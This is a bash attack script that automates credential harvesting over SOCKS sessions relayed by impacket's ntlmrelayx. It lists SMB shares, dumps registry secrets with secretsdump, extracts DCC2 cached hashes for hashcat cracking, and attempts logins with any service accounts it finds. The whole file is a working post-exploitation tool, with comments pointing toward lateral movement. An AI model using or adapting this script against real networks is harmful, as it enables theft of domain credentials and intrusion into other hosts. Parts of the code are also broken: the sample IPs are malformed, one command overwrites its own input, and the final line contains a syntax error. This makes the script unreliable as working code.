#!/bin/bash
#
# This script will allow you to automate recursive
# share listings and registry extr action through socks collected with
# impacket/examples/ntlmrelayx
#
# sockparse.sh Version: 1.00
# Author: Evan Royer
# Date: 11/11/19

# Help Text
echo
echo -e "\e[1;33mUsage: $0 sockslist\e[0m"
echo

echo -e "\e[1;33m
Usage: copy out ze socks list from ntlmrelayx; like so and save in this sockparse dir: \e[0m"
echo

echo "
SMB       10.65.22.79.11    CORP/CORP-MDC$  FALSE        445
SMB       192.168.1.2       tracecorp/eroyer  True        445
SMB       10.65.66.204.117  CORP/CORP-MDC$  FALSE        445
SMB       192.168.1.2      corp1/eroyer  True        445
SMB       10.65.22.204.157  CORP/CORP-MDC$  FALSE        445
SMB       10.65.22.204.160  CORP/CORP-MDC$  FALSE        445
SMB       10.65.33.204.181  CORP/CORP-MDC$  FALSE        445
SMB       10.89.44123.16    CORP/CORP-MDC$  FALSE        445
SMB       10.65.77.204.84   CORP/CORP-MDC$  FALSE        445
SMB       192.168.1.2       corp1/eroyer  FALSE        445
"

cat sockslist | awk '{print $3}' | cut -d'/' -f1 >> domain.log
dmain1="$(cat domain.log)"
echo ""
echo -e "\e[1;33mshares and reg socket input\e[0m"
echo "Shares:"
cat sockslist  | awk '{print $3, "@", $2}' | tr -d '[:blank:]' >> socks_smb
echo "Reg Hives:"
grep TRUE sockslist | awk '{print $3, "@", $2}' | tr -d '[:blank:]' >> socks_secrets

mkdir $dmain1
cat socks_smb
cat domain.log
cat socks_secrets

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mQuerying&&Parsing SMB Share Access\e[0m"
for i in $(cat socks_smb); do proxychains impacket-smbclient $i -file commands.txt -no-pass | tee socks_smb.log ; done

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mQuerying&&Parsing Registry Secrets\e[0m"
for i in $(cat socks_secrets); do proxychains impacket-secretsdump $i -no-pass | tee $i.secrets.log ; done

#for testing, sample svc acc entry
cat service >> $i.secrets.log
sleep 2

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mParsing DCC2 Creds from Secrets\e[0m"
sleep 2
grep "DCC2" $dmain1/* | tee secret.dcc2.parse
cat secret.dcc2.parse | echo ; cut -d ":" -f 2 secret.dcc2.parse | tee dcc2.hashcat
sort dcc2.hashcat | uniq > dcc2.hashcat

echo -e ""
echo -e "\e[1;33m  Hashcat Switch -- 2100  \e[0m"
cat dcc2.hashcat
sleep 2


## Fix/Complete -- Will parse local hashes and attempt lateraly movement

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mLocal Hashes from Secrets\e[0m"
sleep 2
# grep "DCC2" $dmain1/* | tee secret.dcc2.parse
# cat secret.dcc2.parse | echo ; cut -d ":" -f 2 secret.dcc2.parse | tee dcc2.hashcat
# sort dcc2.hashcat | uniq > dcc2.hashcat

echo -e ""
echo -e "\e[1;33m  Hashcat Switch -- 2100  \e[0m"
cat dcc2.hashcat
sleep 2

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mParsing Service Accounts from Secrets\e[0m"
grep -A 1 -e "_SC_" $dmain1/* >> secrets.svc.parse
cat secrets.svc.parse
sleep 2

### if svc accounts exists, runs svcChk.sh ###
if [ "$(wc -l < secrets.svc.parse)" -gt "1" ];
	then
    echo -e "\e[1;33m#######--SVC Account Found, Attempting Login--------##########\e[0m" && \
    ./svcChck.sh;
  else
    echo 'Warning: No Service Accounts, Quitting' && \ ; fi
